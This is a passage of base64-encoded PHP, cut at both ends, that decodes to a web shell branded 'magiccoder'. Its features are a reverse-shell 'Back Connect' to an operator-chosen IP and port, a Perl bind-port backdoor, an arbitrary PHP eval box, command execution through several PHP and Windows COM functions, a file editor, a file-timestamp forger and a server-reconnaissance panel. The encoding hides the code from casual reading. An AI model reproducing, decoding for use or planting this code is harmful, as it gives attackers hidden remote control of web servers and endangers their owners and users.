VjdXRlKCdnY2MgLW8gL3RtcC9tYWdpY2NvZGVyX2JjIC90bXAvbWFnaWNjb2Rlcl9iYy5jJyk7IA0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCcvdG1wL21hZ2ljY29kZXJfYmMuYycpOyANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IGV4ZWN1dGUoIi90bXAvbWFnaWNjb2Rlcl9iYyAkeW91cmlwICR5b3VycG9ydCAmIik7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgY2FzZSAnc2hlbGxfZXhlYyc6IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQHNoZWxsX2V4ZWMoJ2djYyAtbyAvdG1wL21hZ2ljY29kZXJfYmMgL3RtcC9tYWdpY2NvZGVyX2JjLmMnKTsgDQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJy90bXAvbWFnaWNjb2Rlcl9iYy5jJyk7IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQHNoZWxsX2V4ZWMoIi90bXAvbWFnaWNjb2Rlcl9iYyAkeW91cmlwICR5b3VycG9ydCAmIik7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgY2FzZSAncG9wZW4nOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBmcmVhZChwb3BlbignZ2NjIC1vIC90bXAvbWFnaWNjb2Rlcl9iYyAvdG1wL21hZ2ljY29kZXJfYmMuYycsciksIDk5OTkpOyANCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygnL3RtcC9tYWdpY2NvZGVyX2JjLmMnKTsgDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAZnJlYWQocG9wZW4oIi90bXAvbWFnaWNjb2Rlcl9iYyAkeW91cmlwICR5b3VycG9ydCAmIixyKSwgOTk5OSk7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgfSANCiAgICAgICAgbSgiTm93IHNjcmlwdCB0cnkgY29ubmVjdCB0byAkeW91cmlwIHBvcnQgJHlvdXJwb3J0IC4uLiIpOyANCiAgICAgICAgZWNobyAnPGJyPjxjZW50ZXI+VXNlIGZyb20gPGI+Jy4kX1BPU1RbJ2V4ZWNmdW5jdGlvbl9jYiddLic8L2I+IGZ1bmN0aW9uPGhyIHdpZHRoPSIyMjJweCIgbm9zaGFkZSAvPjwvY2VudGVyPic7IA0KICAgIH0gDQoNCiAgICBmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQmFjayBDb25uZWN0JykpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnbmV0Jyk7IA0KICAgIHAoJzxwPicpOyANCiAgICBwKCdZb3VyIElQOicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4neW91cmlwJywnc2l6ZSc9PjIwLCd2YWx1ZSc9PiR5b3VyaXApKTsgDQogICAgcCgnWW91ciBQb3J0OicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4neW91cnBvcnQnLCdzaXplJz0+MTUsJ3ZhbHVlJz0+JHlvdXJwb3J0KSk7IA0KICAgIHAoJ1VzZTonKTsgDQogICAgbWFrZXNlbGVjdChhcnJheSgnbmFtZSc9Pid1c2UnLCdvcHRpb24nPT4kdXNlZGIsJ3NlbGVjdGVkJz0+JHVzZSkpOyANCiAgICBlY2hvICJGdW5jdGlvbjogPHNlbGVjdCBjbGFzcz1cImlucHV0XCIgbmFtZT1cImV4ZWNmdW5jdGlvbl9jYlwiID5cbjxvcHRpb24gdmFsdWU9XCJzeXN0ZW1cIj5zeXN0ZW08L29wdGlvbj5cbjxvcHRpb24gdmFsdWU9XCJwYXNzdGhydVwiPnBhc3N0aHJ1PC9vcHRpb24+XG48b3B0aW9uIHZhbHVlPVwiZXhlY1wiPmV4ZWM8L29wdGlvbj5cbjxvcHRpb24gdmFsdWU9XCJleGVjdXRlXCI+ZXhlY3V0ZTwvb3B0aW9uPlxuPG9wdGlvbiB2YWx1ZT1cInNoZWxsX2V4ZWNcIj5zaGVsbF9leGVjPC9vcHRpb24+XG48b3B0aW9uIHZhbHVlPVwicG9wZW5cIj5wb3Blbjwvb3B0aW9uPlxuPC9zZWxlY3Q+XG4iOyANCg0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidzdGFydF9jYicsJ3ZhbHVlJz0+J1N0YXJ0JywndHlwZSc9PidzdWJtaXQnLCdjbGFzcyc9PididCcpKTsgDQogICAgcCgnPC9wPicpOyANCiAgICBmb3JtZm9vdCgpOyANCi8vLy8vLy8vLy8vLy8vLy8gDQogICAgISR5b3VycG9ydF9iaW5kICYmICR5b3VycG9ydF9iaW5kID0gJzEzNzAwNTI3JzsgDQogICAgJHVzZWRiID0gYXJyYXkoJ3BlcmwnPT4ncGVybCcpOyANCiAgICBpZiAoJHN0YXJ0X2JpbmQgJiYgJHlvdXJwb3J0ICYmICR1c2UpeyANCiAgICAgICAgaWYgKCR1c2UgPT0gJ3BlcmwnKSB7IA0KICAgICAgICAgICAgY2YoJy90bXAvbWFnaWNjb2Rlcl9iaW5kX3BsJywkYmluZF9wbCk7IA0KICAgICAgICAgICAgc3dpdGNoICgkX1BPU1RbJ2V4ZWNmdW5jdGlvbl9iaW5kJ10pIHsgDQogICAgICAgICAgICAgICAgY2FzZSAnc3lzdGVtJzogDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAc3lzdGVtKHdoaWNoKCdwZXJsJykuIiAvdG1wL21hZ2ljY29kZXJfYmluZF9wbCAkeW91cnBvcnRfYmluZCAmIik7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgY2FzZSAncGFzc3RocnUnOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBwYXNzdGhydSh3aGljaCgncGVybCcpLiIgL3RtcC9tYWdpY2NvZGVyX2JpbmRfcGwgJHlvdXJwb3J0X2JpbmQgJiIpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ2V4ZWMnOiANCiAgICAgICAgICAgICAgICAgICAgJHJlcyA9IEBleGVjKHdoaWNoKCdwZXJsJykuIiAvdG1wL21hZ2ljY29kZXJfYmluZF9wbCAkeW91cnBvcnRfYmluZCAmIik7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgY2FzZSAnZXhlY3V0ZSc6IA0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gQGV4ZWN1dGUod2hpY2goJ3BlcmwnKS4iIC90bXAvbWFnaWNjb2Rlcl9iaW5kX3BsICR5b3VycG9ydF9iaW5kICYiKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdzaGVsbF9leGVjJzogDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAc2hlbGxfZXhlYyh3aGljaCgncGVybCcpLiIgL3RtcC9tYWdpY2NvZGVyX2JpbmRfcGwgJHlvdXJwb3J0X2JpbmQgJiIpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ3BvcGVuJzogDQogICAgICAgICAgICAgICAgICAgICRyZXMgPSBAZnJlYWQocG9wZW4od2hpY2goJ3BlcmwnKS4iIC90bXAvbWFnaWNjb2Rlcl9iaW5kX3BsICR5b3VycG9ydF9iaW5kICYiLHIpLCA5OTk5KTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICB9IA0KDQogICAgICAgIH0gDQogICAgICAgIG0oImJpbmQgb24gcG9ydCAkeW91cnBvcnRfYmluZCBTdGFydGVkLi4uIik7IA0KICAgICAgICBlY2hvICc8YnI+PGNlbnRlcj5Vc2UgZnJvbSA8Yj4nLiRfUE9TVFsnZXhlY2Z1bmN0aW9uX2JpbmQnXS4nPC9iPiBmdW5jdGlvbjxociB3aWR0aD0iMjIycHgiIG5vc2hhZGUgLz48L2NlbnRlcj4nOyANCg0KICAgIH0gDQoNCiAgICBmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQmluZCBQb3J0JykpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnbmV0Jyk7IA0KICAgIHAoJzxwPicpOyANCiAgICBwKCdZb3VyIFBvcnQ6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9Pid5b3VycG9ydF9iaW5kJywnc2l6ZSc9PjE1LCd2YWx1ZSc9PiR5b3VycG9ydF9iaW5kKSk7IA0KICAgIHAoJ1VzZTonKTsgDQogICAgbWFrZXNlbGVjdChhcnJheSgnbmFtZSc9Pid1c2UnLCdvcHRpb24nPT4kdXNlZGIsJ3NlbGVjdGVkJz0+JHVzZSkpOyANCiAgICBlY2hvICJGdW5jdGlvbjogPHNlbGVjdCBjbGFzcz1cImlucHV0XCIgbmFtZT1cImV4ZWNmdW5jdGlvbl9iaW5kXCIgPlxuPG9wdGlvbiB2YWx1ZT1cInN5c3RlbVwiPnN5c3RlbTwvb3B0aW9uPlxuPG9wdGlvbiB2YWx1ZT1cInBhc3N0aHJ1XCI+cGFzc3RocnU8L29wdGlvbj5cbjxvcHRpb24gdmFsdWU9XCJleGVjXCI+ZXhlYzwvb3B0aW9uPlxuPG9wdGlvbiB2YWx1ZT1cImV4ZWN1dGVcIj5leGVjdXRlPC9vcHRpb24+XG48b3B0aW9uIHZhbHVlPVwic2hlbGxfZXhlY1wiPnNoZWxsX2V4ZWM8L29wdGlvbj5cbjxvcHRpb24gdmFsdWU9XCJwb3BlblwiPnBvcGVuPC9vcHRpb24+XG48L3NlbGVjdD5cbiI7IA0KICAgICANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nc3RhcnRfYmluZCcsJ3ZhbHVlJz0+J1N0YXJ0JywndHlwZSc9PidzdWJtaXQnLCdjbGFzcyc9PididCcpKTsgDQogICAgcCgnPC9wPicpOyANCiAgICBmb3JtZm9vdCgpOyANCg0KfS8vZW5kIHNxbCBiYWNrdXAgDQoNCmVsc2VpZiAoJGFjdGlvbiA9PSAnZXZhbCcpIHsgDQogICAgJHBocGNvZGUgPSB0cmltKCRwaHBjb2RlKTsgDQogICAgaWYoJHBocGNvZGUpeyANCiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcjPFw/I3NpJywgJHBocGNvZGUpKSB7IA0KICAgICAgICAgICAgJHBocGNvZGUgPSAiPD9waHBcblxueyRwaHBjb2RlfVxuXG4/PiI7IA0KICAgICAgICB9IA0KICAgICAgICBldmFsKCI/Ii4iPiRwaHBjb2RlPD8iKTsgDQogICAgfSANCiAgICBmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nRXZhbCBQSFAgQ29kZScpKTsgDQogICAgbWFrZWhpZGUoJ2FjdGlvbicsJ2V2YWwnKTsgDQogICAgbWFrZXRleHQoYXJyYXkoJ3RpdGxlJz0+J1BIUCBDb2RlJywnbmFtZSc9PidwaHBjb2RlJywgJ3ZhbHVlJz0+JHBocGNvZGUpKTsgDQogICAgZm9ybWZvb3RlcigpOyANCn0vL2VuZCBldmFsIA0KDQplbHNlaWYgKCRhY3Rpb24gPT0gJ2VkaXRmaWxlJykgeyANCiAgICBpZihmaWxlX2V4aXN0cygkb3BmaWxlKSkgeyANCiAgICAgICAgJGZwPUBmb3Blbigkb3BmaWxlLCdyJyk7IA0KICAgICAgICAkY29udGVudHM9QGZyZWFkKCRmcCwgZmlsZXNpemUoJG9wZmlsZSkpOyANCiAgICAgICAgQGZjbG9zZSgkZnApOyANCiAgICAgICAgJGNvbnRlbnRzPWh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnRzKTsgDQogICAgfSANCiAgICBmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQ3JlYXRlIC8gRWRpdCBGaWxlJykpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnZmlsZScpOyANCiAgICBtYWtlaGlkZSgnZGlyJywkbm93cGF0aCk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nQ3VycmVudCBGaWxlIChpbXBvcnQgbmV3IGZpbGUgbmFtZSBhbmQgbmV3IGZpbGUpJywnbmFtZSc9PidlZGl0ZmlsZW5hbWUnLCd2YWx1ZSc9PiRvcGZpbGUsJ25ld2xpbmUnPT4xKSk7IA0KICAgIG1ha2V0ZXh0KGFycmF5KCd0aXRsZSc9PidGaWxlIENvbnRlbnQnLCduYW1lJz0+J2ZpbGVjb250ZW50JywndmFsdWUnPT4kY29udGVudHMpKTsgDQogICAgZm9ybWZvb3RlcigpOyANCn0vL2VuZCBlZGl0ZmlsZSANCg0KZWxzZWlmICgkYWN0aW9uID09ICduZXd0aW1lJykgeyANCiAgICAkb3BmaWxlbXRpbWUgPSBAZmlsZW10aW1lKCRvcGZpbGUpOyANCiAgICAvLyR0aW1lID0gc3RydG90aW1lKCIkeWVhci0kbW9udGgtJGRheSAkaG91cjokbWludXRlOiRzZWNvbmQiKTsgDQogICAgJGNhY2hlbW9udGggPSBhcnJheSgnSmFudWFyeSc9PjEsJ0ZlYnJ1YXJ5Jz0+MiwnTWFyY2gnPT4zLCdBcHJpbCc9PjQsJ01heSc9PjUsJ0p1bmUnPT42LCdKdWx5Jz0+NywnQXVndXN0Jz0+OCwnU2VwdGVtYmVyJz0+OSwnT2N0b2Jlcic9PjEwLCdOb3ZlbWJlcic9PjExLCdEZWNlbWJlcic9PjEyKTsgDQogICAgZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0Nsb25lIGZpbGUgd2FzIGxhc3QgbW9kaWZpZWQgdGltZScpKTsgDQogICAgbWFrZWhpZGUoJ2FjdGlvbicsJ2ZpbGUnKTsgDQogICAgbWFrZWhpZGUoJ2RpcicsJG5vd3BhdGgpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0FsdGVyIGZpbGUnLCduYW1lJz0+J2N1cmZpbGUnLCd2YWx1ZSc9PiRvcGZpbGUsJ3NpemUnPT4xMjAsJ25ld2xpbmUnPT4xKSk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nUmVmZXJlbmNlIGZpbGUgKGZ1bGxwYXRoKScsJ25hbWUnPT4ndGFyZmlsZScsJ3NpemUnPT4xMjAsJ25ld2xpbmUnPT4xKSk7IA0KICAgIGZvcm1mb290ZXIoKTsgDQogICAgZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J1NldCBsYXN0IG1vZGlmaWVkJykpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnZmlsZScpOyANCiAgICBtYWtlaGlkZSgnZGlyJywkbm93cGF0aCk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nQ3VycmVudCBmaWxlIChmdWxscGF0aCknLCduYW1lJz0+J2N1cmZpbGUnLCd2YWx1ZSc9PiRvcGZpbGUsJ3NpemUnPT4xMjAsJ25ld2xpbmUnPT4xKSk7IA0KICAgIHAoJzxwPkluc3RlYWQgJnJhcXVvOycpOyANCiAgICBwKCd5ZWFyOicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4neWVhcicsJ3ZhbHVlJz0+ZGF0ZSgnWScsJG9wZmlsZW10aW1lKSwnc2l6ZSc9PjQpKTsgDQogICAgcCgnbW9udGg6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9Pidtb250aCcsJ3ZhbHVlJz0+ZGF0ZSgnbScsJG9wZmlsZW10aW1lKSwnc2l6ZSc9PjIpKTsgDQogICAgcCgnZGF5OicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nZGF5JywndmFsdWUnPT5kYXRlKCdkJywkb3BmaWxlbXRpbWUpLCdzaXplJz0+MikpOyANCiAgICBwKCdob3VyOicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4naG91cicsJ3ZhbHVlJz0+ZGF0ZSgnSCcsJG9wZmlsZW10aW1lKSwnc2l6ZSc9PjIpKTsgDQogICAgcCgnbWludXRlOicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4nbWludXRlJywndmFsdWUnPT5kYXRlKCdpJywkb3BmaWxlbXRpbWUpLCdzaXplJz0+MikpOyANCiAgICBwKCdzZWNvbmQ6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidzZWNvbmQnLCd2YWx1ZSc9PmRhdGUoJ3MnLCRvcGZpbGVtdGltZSksJ3NpemUnPT4yKSk7IA0KICAgIHAoJzwvcD4nKTsgDQogICAgZm9ybWZvb3RlcigpOyANCn0vL2VuZCBuZXd0aW1lIA0KDQplbHNlaWYgKCRhY3Rpb24gPT0gJ3NoZWxsJykgeyANCiAgICBpZiAoSVNfV0lOICYmIElTX0NPTSkgeyANCiAgICAgICAgaWYoJHByb2dyYW0gJiYgJHBhcmFtZXRlcikgeyANCiAgICAgICAgICAgICRzaGVsbD0gbmV3IENPTSgnU2hlbGwuQXBwbGljYXRpb24nKTsgDQogICAgICAgICAgICAkYSA9ICRzaGVsbC0+U2hlbGxFeGVjdXRlKCRwcm9ncmFtLCRwYXJhbWV0ZXIpOyANCiAgICAgICAgICAgIG0oJ1Byb2dyYW0gcnVuIGhhcyAnLighJGEgPyAnc3VjY2VzcycgOiAnZmFpbCcpKTsgDQogICAgICAgIH0gDQogICAgICAgICEkcHJvZ3JhbSAmJiAkcHJvZ3JhbSA9ICdjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUnOyANCiAgICAgICAgISRwYXJhbWV0ZXIgJiYgJHBhcmFtZXRlciA9ICcvYyBuZXQgc3RhcnQgPiAnLlNBX1JPT1QuJ2xvZy50eHQnOyANCiAgICAgICAgZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0V4ZWN1dGUgUHJvZ3JhbScpKTsgDQogICAgICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzaGVsbCcpOyANCiAgICAgICAgbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidQcm9ncmFtJywnbmFtZSc9Pidwcm9ncmFtJywndmFsdWUnPT4kcHJvZ3JhbSwnbmV3bGluZSc9PjEpKTsgDQogICAgICAgIHAoJzxwPicpOyANCiAgICAgICAgbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidQYXJhbWV0ZXInLCduYW1lJz0+J3BhcmFtZXRlcicsJ3ZhbHVlJz0+JHBhcmFtZXRlcikpOyANCiAgICAgICAgbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J3N1Ym1pdCcsJ2NsYXNzJz0+J2J0JywndHlwZSc9PidzdWJtaXQnLCd2YWx1ZSc9PidFeGVjdXRlJykpOyANCiAgICAgICAgcCgnPC9wPicpOyANCiAgICAgICAgZm9ybWZvb3QoKTsgDQogICAgfSANCiAgICBmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nRXhlY3V0ZSBDb21tYW5kJykpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnc2hlbGwnKTsgDQogICAgaWYgKElTX1dJTiAmJiBJU19DT00pIHsgDQogICAgICAgICRleGVjZnVuY2RiID0gYXJyYXkoJ3BocGZ1bmMnPT4ncGhwZnVuYycsJ3dzY3JpcHQnPT4nd3NjcmlwdCcsJ3Byb2Nfb3Blbic9Pidwcm9jX29wZW4nKTsgDQogICAgICAgIG1ha2VzZWxlY3QoYXJyYXkoJ3RpdGxlJz0+J1VzZTonLCduYW1lJz0+J2V4ZWNmdW5jJywnb3B0aW9uJz0+JGV4ZWNmdW5jZGIsJ3NlbGVjdGVkJz0+JGV4ZWNmdW5jLCduZXdsaW5lJz0+MSkpOyANCiAgICB9IA0KICAgIHAoJzxwPicpOyANCiAgICBtYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0NvbW1hbmQnLCduYW1lJz0+J2NvbW1hbmQnLCd2YWx1ZSc9PiRjb21tYW5kKSk7IA0KICAgIGlmICghSVNfV0lOICYmICFJU19DT00peyAgICAgDQogICAgICAgIGVjaG8gIjxzZWxlY3QgY2xhc3M9XCJpbnB1dFwiIG5hbWU9XCJleGVjZnVuY3Rpb25cIiA+XG48b3B0aW9uIHZhbHVlPVwic3lzdGVtXCI+c3lzdGVtPC9vcHRpb24+XG48b3B0aW9uIHZhbHVlPVwicGFzc3RocnVcIj5wYXNzdGhydTwvb3B0aW9uPlxuPG9wdGlvbiB2YWx1ZT1cImV4ZWNcIj5leGVjPC9vcHRpb24+XG48b3B0aW9uIHZhbHVlPVwiZXhlY3V0ZVwiPmV4ZWN1dGU8L29wdGlvbj5cbjxvcHRpb24gdmFsdWU9XCJzaGVsbF9leGVjXCI+c2hlbGxfZXhlYzwvb3B0aW9uPlxuPG9wdGlvbiB2YWx1ZT1cInBvcGVuXCI+cG9wZW48L29wdGlvbj5cbjwvc2VsZWN0PlxuIjsgDQp9IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidzdWJtaXQnLCdjbGFzcyc9PididCcsJ3R5cGUnPT4nc3VibWl0JywndmFsdWUnPT4nRXhlY3V0ZScpKTsgDQogICAgcCgnPC9wPicpOyANCiAgICBmb3JtZm9vdCgpOyANCg0KICAgIGlmICgkY29tbWFuZCkgeyANCiAgICAgICAgcCgnPGhyIHdpZHRoPSIxMDAlIiBub3NoYWRlIC8+PHByZT4nKTsgDQogICAgICAgIGlmICgkZXhlY2Z1bmM9PSd3c2NyaXB0JyAmJiBJU19XSU4gJiYgSVNfQ09NKSB7IA0KICAgICAgICAgICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsgDQogICAgICAgICAgICAkZXhlYyA9ICR3c2gtPmV4ZWMoJ2NtZC5leGUgL2MgJy4kY29tbWFuZCk7IA0KICAgICAgICAgICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsgDQogICAgICAgICAgICAkc3Ryb3V0cHV0ID0gJHN0ZG91dC0+UmVhZEFsbCgpOyANCiAgICAgICAgICAgIGVjaG8gJHN0cm91dHB1dDsgDQogICAgICAgIH0gZWxzZWlmICgkZXhlY2Z1bmM9PSdwcm9jX29wZW4nICYmIElTX1dJTiAmJiBJU19DT00pIHsgDQogICAgICAgICAgICAkZGVzY3JpcHRvcnNwZWMgPSBhcnJheSggDQogICAgICAgICAgICAgICAwID0+IGFycmF5KCdwaXBlJywgJ3InKSwgDQogICAgICAgICAgICAgICAxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwgDQogICAgICAgICAgICAgICAyID0+IGFycmF5KCdwaXBlJywgJ3cnKSANCiAgICAgICAgICAgICk7IA0KICAgICAgICAgICAgJHByb2Nlc3MgPSBwcm9jX29wZW4oJF9TRVJWRVJbJ0NPTVNQRUMnXSwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOyANCiAgICAgICAgICAgIGlmIChpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsgDQogICAgICAgICAgICAgICAgZndyaXRlKCRwaXBlc1swXSwgJGNvbW1hbmQuIlxyXG4iKTsgDQogICAgICAgICAgICAgICAgZndyaXRlKCRwaXBlc1swXSwgImV4aXRcclxuIik7IA0KICAgICAgICAgICAgICAgIGZjbG9zZSgkcGlwZXNbMF0pOyANCiAgICAgICAgICAgICAgICB3aGlsZSAoIWZlb2YoJHBpcGVzWzFdKSkgeyANCiAgICAgICAgICAgICAgICAgICAgZWNobyBmZ2V0cygkcGlwZXNbMV0sIDEwMjQpOyANCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIGZjbG9zZSgkcGlwZXNbMV0pOyANCiAgICAgICAgICAgICAgICB3aGlsZSAoIWZlb2YoJHBpcGVzWzJdKSkgeyANCiAgICAgICAgICAgICAgICAgICAgZWNobyBmZ2V0cygkcGlwZXNbMl0sIDEwMjQpOyANCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIGZjbG9zZSgkcGlwZXNbMl0pOyANCiAgICAgICAgICAgICAgICBwcm9jX2Nsb3NlKCRwcm9jZXNzKTsgDQogICAgICAgICAgICB9IA0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgIGVjaG8gJzxjZW50ZXI+VXNlIGZyb20gPGI+Jy4kX1BPU1RbJ2V4ZWNmdW5jdGlvbiddLic8L2I+IGZ1bmN0aW9uPGhyIHdpZHRoPSIyMjJweCIgbm9zaGFkZSAvPjwvY2VudGVyPic7IA0KICAgICAgICAgICAgc3dpdGNoICgkX1BPU1RbJ2V4ZWNmdW5jdGlvbiddKSB7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ3N5c3RlbSc6IA0KICAgICAgICAgICAgICAgICAgICBAc3lzdGVtKCRjb21tYW5kKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdwYXNzdGhydSc6IA0KICAgICAgICAgICAgICAgICAgICBAcGFzc3RocnUoJGNvbW1hbmQpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ2V4ZWMnOiANCiAgICAgICAgICAgICAgICAgICAgZWNobyBAZXhlYygkY29tbWFuZCk7IA0KICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgY2FzZSAnZXhlY3V0ZSc6IA0KICAgICAgICAgICAgICAgICAgICBlY2hvIEBleGVjdXRlKCRjb21tYW5kKTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICdzaGVsbF9leGVjJzogDQogICAgICAgICAgICAgICAgICAgIGVjaG8gQHNoZWxsX2V4ZWMoJGNvbW1hbmQpOyANCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgIGNhc2UgJ3BvcGVuJzogDQogICAgICAgICAgICAgICAgICAgIGVjaG8gQGZyZWFkKHBvcGVuKCRjb21tYW5kLHIpLCA5OTk5KTsgDQogICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICB9IA0KICAgICAgICBwKCc8L3ByZT4nKTsgDQogICAgfSANCn0vL2VuZCBzaGVsbCANCg0KZWxzZWlmICgkYWN0aW9uID09ICdwaHBlbnYnKSB7IA0KICAgICR1cHNpemU9Z2V0Y2ZnKCdmaWxlX3VwbG9hZHMnKSA/IGdldGNmZygndXBsb2FkX21heF9maWxlc2l6ZScpIDogJ05vdCBhbGxvd2VkJzsgDQogICAgJGFkbWlubWFpbD1pc3NldCgkX1NFUlZFUlsnU0VSVkVSX0FETUlOJ10pID8gJF9TRVJWRVJbJ1NFUlZFUl9BRE1JTiddIDogZ2V0Y2ZnKCdzZW5kbWFpbF9mcm9tJyk7IA0KICAgICEkZGlzX2Z1bmMgJiYgJGRpc19mdW5jID0gJ05vJzsgICAgIA0KICAgICRpbmZvID0gYXJyYXkoIA0KICAgICAgICAxID0+IGFycmF5KCdTZXJ2ZXIgVGltZScsZGF0ZSgnWS9tL2QgaDppOnMnLCR0aW1lc3RhbXApKSwgDQogICAgICAgIDIgPT4gYXJyYXkoJ1NlcnZlciBEb21haW4nLCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSwgDQogICAgICAgIDMgPT4gYXJyYXkoJ1NlcnZlciBJUCcsZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpLCANCiAgICAgICAgNCA9PiBhcnJheSgnU2VydmVyIE9TJyxQSFBfT1MpLCANCiAgICAgICAgNSA9PiBhcnJheSgnU2VydmVyIE9TIENoYXJzZXQnLCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSwgDQogICAgICAgIDYgPT4gYXJyYXkoJ1NlcnZlciBTb2Z0d2FyZScsJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddKSwgDQogICAgICAgIDcgPT4gYXJyYXkoJ1NlcnZlciBXZWIgUG9ydCcsJF9TRVJWRVJbJ1NFUlZFUl9QT1JUJ10pLCANCiAgICAgICAgOCA9PiBhcnJheSgnUEhQIHJ1biBtb2RlJyxzdHJ0b3VwcGVyKHBocF9zYXBpX25hbWUoKSkpLCANCiAgICAgICAgOSA9PiBhcnJheSgnVGhlIGZpbGUgcGF0aCcsX19GSUxFX18pLCANCg0KICAgICAgICAxMCA9PiBhcnJheSgnUEhQIFZlcnNpb24nLFBIUF9WRVJTSU9OKSwgDQogICAgICAgIDExID0+IGFycmF5KCdQSFBJTkZPJywoSVNfUEhQSU5GTyA/ICc8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKFwncGhwaW5mb1wnKTsiPlllczwvYT4nIDogJ05vJykpLCANCiAgICAgICAgMTIgPT4gYXJyYXkoJ1NhZmUgTW9kZScsZ2V0Y2ZnKCdzYWZlX21vZGUnKSksIA0KICAgICAgICAxMyA9PiBhcnJheSgnQWRtaW5pc3RyYXRvcicsJGFkbWlubWFpbCksIA0KICAgICAgICAxNCA9PiBhcnJheSgnYWxsb3dfdXJsX2ZvcGVuJyxnZXRjZmcoJ2FsbG93X3VybF9mb3BlbicpKSwgDQogICAgICAgIDE1ID0+IGFycmF5KCdlbmFibGVfZGwnLGdldGNmZygnZW5hYmxlX2RsJykpLCANCiAgICAgICAgMTYgPT4gYXJyYXkoJ2Rpc3BsYXlfZXJyb3JzJyxnZXRjZmcoJ2Rpc3BsYXlfZXJ